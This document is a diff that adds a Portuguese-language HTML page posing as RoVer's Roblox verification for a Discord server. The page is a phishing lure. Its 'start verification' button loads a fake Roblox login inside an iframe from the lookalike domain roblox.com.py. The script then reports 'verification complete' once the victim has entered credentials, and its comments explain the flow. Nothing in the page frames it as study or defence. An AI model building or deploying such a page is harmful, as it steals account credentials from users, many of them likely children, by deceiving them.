@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação Roblox</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+    body {
+      margin: 0;
+      padding: 0;
+      background: #111111;
+      color: #ffffff;
+      font-family: 'Roboto', sans-serif;
+      min-height: 100vh;
+    }
+    header {
+      background: #ff3399;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 1.1rem;
+    }
+    .logo {
+      font-weight: bold;
+      font-size: 1.5rem;
+    }
+    .menu {
+      display: flex;
+      gap: 20px;
+    }
+    .menu a {
+      color: white;
+      text-decoration: none;
+    }
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #333;
+    }
+    main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: calc(100vh - 60px);
+      text-align: center;
+      padding: 20px;
+    }
+    .content {
+      max-width: 600px;
+      width: 100%;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #aaaaaa;
+      margin-bottom: 40px;
+      font-size: 1.2rem;
+    }
+    .buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 40px;
+      flex-wrap: wrap;
+    }
+    .btn-primary {
+      background: #ff3399;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn-primary:hover {
+      background: #ff5ab3;
+    }
+    .btn-secondary {
+      background: transparent;
+      color: #ff3399;
+      border: 1px solid #ff3399;
+      padding: 14px 40px;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+    .extra-link {
+      color: #ff3399;
+      text-decoration: none;
+      font-size: 1.1rem;
+    }
+    .initial-content {
+      display: block;
+    }
+    .success-content {
+      display: none;
+      color: #00ff9d;
+      font-size: 2rem;
+      font-weight: 500;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .modal.open {
+      display: flex;
+    }
+    .modal-content {
+      width: 90%;
+      max-width: 900px;
+      height: 85%;
+      background: #1e1e1e;
+      border-radius: 12px;
+      padding: 20px;
+      position: relative;
+      box-shadow: 0 0 30px rgba(255, 51, 153, 0.3);
+    }
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 2.5rem;
+      cursor: pointer;
+      z-index: 10;
+    }
+    .verification-container {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      border-radius: 8px;
+      overflow: hidden;
+      border: 1px solid #444;
+    }
+    .loading-screen {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #1e1e1e;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-size: 1.4rem;
+      z-index: 5;
+    }
+    .loading-dots::after {
+      content: '';
+      animation: dots 1.5s infinite;
+    }
+    @keyframes dots {
+      0%, 20% { content: '.'; }
+      40% { content: '..'; }
+      60% { content: '...'; }
+      80%, 100% { content: ''; }
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">RoVer</div>
+    <div class="menu">
+      <a href="#">Help</a>
+      <a href="#">Team Members</a>
+      <a href="#">Manage Servers</a>
+      <a href="#">Verification</a>
+    </div>
+    <div class="user-info">
+      <span>adundeoperacao</span>
+      <div class="avatar"></div>
+    </div>
+  </header>
+  <main>
+    <div class="content">
+      <div class="initial-content" id="initial-content">
+        <h1>Você ainda não está verificado</h1>
+        <p>Para acessar recursos exclusivos, complete a verificação de segurança Roblox.</p>
+        <div class="buttons">
+          <button class="btn-primary" id="start-verification">Iniciar Verificação</button>
+          <button class="btn-secondary">Cancelar</button>
+        </div>
+        <a href="#" class="extra-link">Precisa de ajuda com a verificação? →</a>
+      </div>
+      <div class="success-content" id="success-content">
+        <h1>Verificação concluída!</h1>
+        <p>Agora você tem acesso total ao servidor</p>
+      </div>
+    </div>
+  </main>
+  <div class="modal" id="verification-modal">
+    <div class="modal-content">
+      <button class="close-btn" id="close-modal">×</button>
+      <div class="verification-container">
+        <div class="loading-screen" id="loading">
+          <div>Preparando verificação<span class="loading-dots"></span></div>
+        </div>
+        <iframe src="" allowfullscreen></iframe>
+      </div>
+    </div>
+  </div>
+  <script>
+    const verificationModal = document.getElementById('verification-modal');
+    const initialContent = document.getElementById('initial-content');
+    const successContent = document.getElementById('success-content');
+    const startBtn = document.getElementById('start-verification');
+    const closeBtn = document.getElementById('close-modal');
+    const loading = document.getElementById('loading');
+    const iframe = document.querySelector('iframe');
+
+    // <<< MUDE AQUI O LINK DO IFRAME >>>
+    const IFRAME_URL = "https://roblox.com.py/login?returnUrl=3667493294562156"; 
+    // Ex: "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"
+
+    let isFirstLoad = true; // Ignora a primeira carga do vídeo
+
+    // Função que LIBERA o acesso (só chamada quando o roblox.com é detectado)
+    function completeVerification() {
+      verificationModal.classList.remove('open');
+      initialContent.style.display = 'none';
+      successContent.style.display = 'block';
+    }
+
+    // Função de fechamento manual (X ou clique fora) - NÃO libera o acesso!
+    function closeModalManually() {
+      verificationModal.classList.remove('open');
+      // Não chama completeVerification() aqui!
+    }
+
+    // Detecta roblox.com e finaliza a verificação
+    function checkForRobloxDomain() {
+      if (isFirstLoad) {
+        isFirstLoad = false;
+        return;
+      }
+
+      try {
+        const currentUrl = iframe.contentWindow.location.href.toLowerCase();
+        if (currentUrl.includes("roblox.com")) {
+          loading.innerHTML = '<div>Verificando<span class="loading-dots"></span></div>';
+          loading.style.display = 'flex';
+          iframe.style.display = 'none';
+
+          setTimeout(() => {
+            completeVerification(); // Só aqui libera!
+          }, 3000);
+        }
+      } catch (e) {
+        // Erro de CORS = domínio mudou (roblox.com comum)
+        loading.innerHTML = '<div>Verificando<span class="loading-dots"></span></div>';
+        loading.style.display = 'flex';
+        iframe.style.display = 'none';
+
+        setTimeout(() => {
+          completeVerification();
+        }, 3000);
+      }
+    }
+
+    startBtn.onclick = () => {
+      isFirstLoad = true;
+      verificationModal.classList.add('open');
+      
+      loading.innerHTML = '<div>Preparando verificação<span class="loading-dots"></span></div>';
+      loading.style.display = 'flex';
+      iframe.style.display = 'none';
+
+      iframe.src = IFRAME_URL;
+
+      iframe.onload = () => {
+        setTimeout(() => {
+          loading.style.display = 'none';
+          iframe.style.display = 'block';
+        }, 2000);
+      };
+    };
+
+    iframe.addEventListener('load', checkForRobloxDomain);
+
+    // Fechamento manual (não libera)
+    closeBtn.onclick = closeModalManually;
+    verificationModal.onclick = (e) => {
+      if (e.target === verificationModal) closeModalManually();
+    };
+  </script>
+</body>
+</html>
